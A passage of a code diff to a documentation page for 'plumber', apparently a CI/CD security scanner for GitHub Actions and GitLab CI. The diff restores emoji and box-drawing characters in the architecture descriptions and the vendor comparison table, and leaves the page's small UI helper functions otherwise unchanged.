-  opa:{icon:'??',title:'OPA Engine',body:'Open Policy Agent is the industry-standard policy evaluation engine (also used by Kubernetes and Terraform). Plumber feeds the NormalizedPipeline as JSON into OPA and asks it to evaluate all rules simultaneously. OPA returns every finding in one pass.',files:'Files: internal/engine/opa/'},
-  rules:{icon:'??',title:'Rules across 9 risk categories',body:'Each rule is a readable file in the open-source repo. Categories: container/image security, variable injection, secrets handling, pipeline structure, branch and MR protection, platform governance, supply chain, triggers and permissions, ecosystem hygiene.',files:'Files: policies/*.rego � one file per rule'},
-  output:{icon:'??',title:'Score and Findings',body:'Findings are scored using an attack-path model: how likely is this to be exploited, and what is the impact? The result is an A&ndash;E letter score. Output formats: terminal, SARIF (GitHub Code Scanning), JSON, PBOM (Pipeline Bill of Materials), GitLab SAST.',files:'Formats: SARIF, JSON, PBOM, GitLab SAST, CycloneDX, CSV'},
+  yaml:{icon:'📄',title:'Your Workflow Files',body:'The raw YAML files in <code>.github/workflows/</code> (GitHub Actions) or <code>.gitlab-ci.yml</code> (GitLab CI). Plumber reads these directly &mdash; no CI run required, works offline and in pre-commit hooks.',files:'Input: .github/workflows/*.yml or .gitlab-ci.yml'},
+  parser:{icon:'🔍',title:'Go Parser',body:'Provider-specific parsers convert YAML into typed Go structs. The GitHub parser understands Actions syntax. The GitLab parser understands GitLab CI syntax including includes, rules, and variables. Each parser resolves defaults so rules see a complete picture.',files:'Files: github/github_workflows.go, gitlab/gitlab_ci.go'},
+  ir:{icon:'🧱',title:'NormalizedPipeline (the key insight)',body:'Both parsers write into a common data shape &mdash; one struct that represents any pipeline, regardless of platform. This is what makes plumber unique: write a rule once and it works on both GitHub Actions and GitLab CI without modification.',files:'Files: internal/ir/pipeline.go'},
+  opa:{icon:'⚖️',title:'OPA Engine',body:'Open Policy Agent is the industry-standard policy evaluation engine (also used by Kubernetes and Terraform). Plumber feeds the NormalizedPipeline as JSON into OPA and asks it to evaluate all rules simultaneously. OPA returns every finding in one pass.',files:'Files: internal/engine/opa/'},
+  rules:{icon:'📋',title:'Rules across 9 risk categories',body:'Each rule is a readable file in the open-source repo. Categories: container/image security, variable injection, secrets handling, pipeline structure, branch and MR protection, platform governance, supply chain, triggers and permissions, ecosystem hygiene.',files:'Files: policies/*.rego — one file per rule'},
+  output:{icon:'📊',title:'Score and Findings',body:'Findings are scored using an attack-path model: how likely is this to be exploited, and what is the impact? The result is an A&ndash;E letter score. Output formats: terminal, SARIF (GitHub Code Scanning), JSON, PBOM (Pipeline Bill of Materials), GitLab SAST.',files:'Formats: SARIF, JSON, PBOM, GitLab SAST, CycloneDX, CSV'},
 };
 function showArch(id){
   var detail=document.getElementById('arch-detail');
@@ -1047,7 +1047,7 @@ function showArch(id){
   detail.classList.add('open');
 }
 
-// -- Vendor comparison ---------------------------------------------------------
+// ── Vendor comparison ─────────────────────────────────────────────────────────
 var vendors=[
   {name:'getplumber',tagline:'Purpose-built CI/CD security scanner',featured:true,caps:{github:true,gitlab:true,free:true,scoring:true,runtime:false,gate:true}},
   {name:'zizmor',tagline:'Rust-based GitHub Actions linter',caps:{github:true,gitlab:false,free:true,scoring:false,runtime:false,gate:false}},
@@ -1056,7 +1056,7 @@ var vendors=[
   {name:'Semgrep',tagline:'SAST with GitHub Actions rule bundle',caps:{github:true,gitlab:'part',free:'part',scoring:false,runtime:false,gate:false}},
 ];
 var capLabels={github:'GitHub Actions',gitlab:'GitLab CI',free:'Free / no account',scoring:'Attack-path scoring',runtime:'Runtime monitoring',gate:'Block CI (score gate)'};
-function capIcon(v){if(v===true)return '<span class="cap-yes">?</span>';if(v===false)return '<span class="cap-no">?</span>';return '<span class="cap-part">?</span>';}
+function capIcon(v){if(v===true)return '<span class="cap-yes">✓</span>';if(v===false)return '<span class="cap-no">✗</span>';return '<span class="cap-part">◐</span>';}
 var activeFilter='all';
 function filterVendors(f,btn){
   activeFilter=f;
@@ -1077,7 +1077,7 @@ function renderVendors(){
 }
 renderVendors();
 
-// -- OS toggle -----------------------------------------------------------------
+// ── OS toggle ─────────────────────────────────────────────────────────────────
 function showOS(os,btn){
   document.querySelectorAll('.os-btn').forEach(function(b){b.classList.remove('active');});
   btn.classList.add('active');
@@ -1085,7 +1085,7 @@ function showOS(os,btn){
   document.getElementById('os-win').style.display=os==='win'?'':'none';
 }
 
-// -- Copy buttons --------------------------------------------------------------
+// ── Copy buttons ──────────────────────────────────────────────────────────────
 function copyCode(id,btn){
   var el=document.getElementById(id); if(!el)return;
   navigator.clipboard.writeText(el.textContent.trim()).then(function(){
@@ -1093,7 +1093,7 @@ function copyCode(id,btn){
   });
 }
 
-// -- TOC scrollspy -------------------------------------------------------------
+// ── TOC scrollspy ─────────────────────────────────────────────────────────────
 (function(){
   var sections=document.querySelectorAll('.guide-section[id]');
   var links=document.querySelectorAll('.guide-toc a');
